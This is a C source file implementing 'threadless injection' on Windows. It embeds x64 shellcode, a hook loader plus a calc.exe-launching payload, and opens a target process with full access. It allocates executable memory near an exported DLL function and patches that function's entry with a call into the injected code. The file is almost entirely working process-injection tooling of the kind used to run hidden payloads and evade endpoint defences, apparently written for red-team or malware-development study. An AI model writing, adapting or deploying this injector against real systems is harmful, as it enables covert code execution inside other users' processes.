#include "ThreadlessInjection.h"

// stole this from here: https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L31
UCHAR ShellcodeLdr[56] = {
		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
		0xE0, 0x90
};

UCHAR PopCalc[165] = { 
	  0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b,
	  0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x20, 0x49, 0x89, 0xc0, 0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x41, 0x8b,
	  0x40, 0x3c, 0x4c, 0x01, 0xc0, 0x8b, 0x90, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x01, 0xc2, 0x49, 0x89, 0xd1, 0x48, 0x31,
	  0xc0, 0x8b, 0x42, 0x20, 0x4c, 0x01, 0xc0, 0x48, 0x89, 0xc6, 0x48, 0xba, 0x41, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65,
	  0x63, 0x48, 0xc1, 0xea, 0x08, 0x48, 0x31, 0xc9, 0x48, 0xff, 0xc1, 0x48, 0x31, 0xdb, 0x8b, 0x1c, 0x8e, 0x4c, 0x01,
	  0xc3, 0x48, 0x39, 0x13, 0x75, 0xef, 0x48, 0x31, 0xc0, 0x41, 0x8b, 0x41, 0x24, 0x4c, 0x01, 0xc0, 0x48, 0x0f, 0xb7,
	  0x0c, 0x48, 0x48, 0x31, 0xc0, 0x41, 0x8b, 0x41, 0x1c, 0x4c, 0x01, 0xc0, 0x8b, 0x14, 0x88, 0x4c, 0x01, 0xc2, 0x48,
	  0x89, 0xd7, 0x48, 0x31, 0xd2, 0x52, 0x52, 0x48, 0xb9, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x51, 0x48,
	  0x89, 0xe1, 0x48, 0x83, 0xec, 0x50, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x68, 0xc3
};

ULONG_PTR FindOpenMemory
(
	_In_ HANDLE ProcessHandle,
	_In_ ULONG_PTR ExportedFunctionAddress,
	_In_ SIZE_T PayloadSize
)
{

	ULONG_PTR	RemoteAddress	= 0;
	PVOID		RemoteBuffer	= NULL;

	for (RemoteAddress = (ExportedFunctionAddress & 0xFFFFFFFFFFF70000) - 0x70000000; RemoteAddress < ExportedFunctionAddress + 0x70000000; RemoteAddress += 0x10000)
	{

		if ((RemoteBuffer = VirtualAllocEx(ProcessHandle, (LPVOID)RemoteAddress, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)) == NULL)
			continue;

		INFO("Open Memory Found!");
		INFO("[0x%p] Remote Address", (PVOID)RemoteAddress);
		return RemoteAddress;

	}

	WARN("Could Not Find Open Memory!");
	return 0;

}

VOID GenerateHook
(
	_In_ ULONG_PTR OriginalOpcode
)
{

	*(ULONG_PTR*)(ShellcodeLdr + 0x12) = OriginalOpcode;
	INFO("Hook Successful!");

}

BOOLEAN InjectHook
(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID MemoryHoleAddress,
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	DWORD	OldProtection	= 0;
	SIZE_T	BytesWritten	= 0;

	INFO("[0x%p] Memory Hole Address", MemoryHoleAddress);

	if (!VirtualProtectEx(ProcessHandle, MemoryHoleAddress, PayloadSize, PAGE_READWRITE, &OldProtection))
	{
		PRINT_ERROR("VirtualProtectEx");
		return FALSE;
	}

	INFO("Memory Protection: RW");

	if (!WriteProcessMemory(ProcessHandle, MemoryHoleAddress, Payload, PayloadSize, &BytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		return FALSE;
	}

	INFO("Wrote %zu bytes to MemoryHoleAddress", PayloadSize);

	if (!VirtualProtectEx(ProcessHandle, MemoryHoleAddress, PayloadSize, PAGE_EXECUTE_READ, &OldProtection))
	{
		PRINT_ERROR("VirtualProtectEx");
		return FALSE;
	}

	INFO("Current Protection: RX");

	return TRUE;

}

BOOLEAN InjectCallInstruction
(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID ExportedFunctionAddress,
	_In_ PVOID MemoryHoleAddress
)
{

	DWORD	OldProtection	= 0;
	SIZE_T	BytesWritten	= 0;

	INT		PointerAddress	= (INT)((ULONG_PTR)MemoryHoleAddress - ((ULONG_PTR)ExportedFunctionAddress + 5));
	UCHAR	CallOpcode[]	= { 0xe8, 0, 0, 0, 0 };
	*(INT*)(CallOpcode + 1) = PointerAddress;

	INFO("PointerAddress: 0x%p", (PVOID)&PointerAddress);

	if (!VirtualProtectEx(ProcessHandle, ExportedFunctionAddress, sizeof(CallOpcode), PAGE_EXECUTE_READWRITE, &OldProtection))
	{
		PRINT_ERROR("VirtualProtectEx");
		return FALSE;
	}

	INFO("Current Exported Function Protection: RWX");

	if (!WriteProcessMemory(ProcessHandle, ExportedFunctionAddress, CallOpcode, sizeof(CallOpcode), &BytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		return FALSE;
	}

	INFO("Wrote %zu bytes to ExportedFunctionAddress", sizeof(CallOpcode));

	return TRUE;

}

VOID CopyArrays
(
	_In_ UCHAR* ShellcodeLdr,
	_In_ SIZE_T ShellcodeLdrSize,
	_In_ UCHAR* PopCalc,
	_In_ SIZE_T PopCalcSize,
	_Out_ UCHAR* Payload
)
{

	for (SIZE_T i = 0; i < ShellcodeLdrSize; i++)
	{
		Payload[i] = ShellcodeLdr[i];
	}

	INFO("ShellcodeLdr Array Copied!");

	for (SIZE_T i = 0; i < PopCalcSize; i++)
	{
		Payload[ShellcodeLdrSize + i] = PopCalc[i];
	}

	INFO("PopCalc Array Copied!");

}

BOOL GetProcessHandle
(
	_In_ LPCWSTR TargetProcess,
	_Out_ HANDLE* ProcessHandle
)
{

	HANDLE			SnapHandle	= NULL;
	PROCESSENTRY32W pe32		= { 0 };
	pe32.dwSize					= sizeof(pe32);

	DWORD			ProcessId	= 0;

	if (!(SnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) || SnapHandle == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateToolhelp32Snapshot");
		return FALSE; // no point of continuing
	}

	if (!Process32FirstW(SnapHandle, &pe32))
	{
		PRINT_ERROR("Process32FirstW");
		return FALSE;
	}

	do
	{

		if (_wcsicmp(pe32.szExeFile, TargetProcess) == 0)
		{

			ProcessId = pe32.th32ProcessID;

			if (!(*ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) || *ProcessHandle == NULL)
			{
				PRINT_ERROR("OpenProcess");
				return FALSE;
			}

		}

	} while (Process32NextW(SnapHandle, &pe32));


	if (SnapHandle)
		CloseHandle(SnapHandle);

	return TRUE;

}

BOOLEAN ThreadlessInjection
(
	_In_ LPCWSTR TargetDll,
	_In_ LPCSTR TargetFunction,
	_In_ LPCWSTR TargetProcess
)
{

	PVOID		ProcessHandle		= NULL;
	PVOID		ExportedFunction	= NULL;
	ULONG_PTR	OriginalBytes		= 0;
	ULONG_PTR	MemHoleAddress		= 0;
	SIZE_T		PayloadSize			= 0;
	DWORD		OldProtection		= 0;

	INFO("Tagret Dll: %ls", TargetDll);
	INFO("Target Function: %s", TargetFunction);
	INFO("Target Process: %ls", TargetProcess);

	if ((ExportedFunction = GetProcAddress(GetModuleHandleW(TargetDll), TargetFunction)) == NULL)
	{
		PRINT_ERROR("GetProcAddress");
		return FALSE;
	}

	INFO("Exported Function: 0x%p", ExportedFunction);

	if (!GetProcessHandle(TargetProcess, &ProcessHandle))
	{
		PRINT_ERROR("GetProcessHandle");
		return FALSE;
	}

	INFO("[0x%p] Process Handle", ProcessHandle);

	if ((MemHoleAddress = FindOpenMemory(ProcessHandle, (ULONG_PTR)ExportedFunction, sizeof(ShellcodeLdr) + sizeof(PopCalc))) == 0)
	{
		PRINT_ERROR("FindOpenMemory");
		return FALSE;
	}

	OriginalBytes = *(ULONG_PTR*)ExportedFunction;

	INFO("[0x%p] Original Bytes, Generating Hook!", (PVOID)&OriginalBytes);
	GenerateHook(OriginalBytes);

	UCHAR Payload[sizeof(ShellcodeLdr) + sizeof(PopCalc)];
	CopyArrays((UCHAR*)ShellcodeLdr, sizeof(ShellcodeLdr), PopCalc, sizeof(PopCalc), (UCHAR*)Payload);
	PayloadSize = sizeof(Payload);

	INFO("[0x%p] Payload Address", (PVOID)&Payload);

	if (!InjectHook(ProcessHandle, (PVOID)MemHoleAddress, Payload, PayloadSize))
	{
		PRINT_ERROR("InjectHook");
		return FALSE;
	}

	INFO("Injected Hook!");

	if (!InjectCallInstruction(ProcessHandle, ExportedFunction, (PVOID)MemHoleAddress))
	{
		PRINT_ERROR("InjectCallInstruction");
		return FALSE;
	}

	INFO("Injected Call Instruction!");

	INFO("Sleeping for 2 seconds...");
	Sleep(2000);

	return TRUE;

}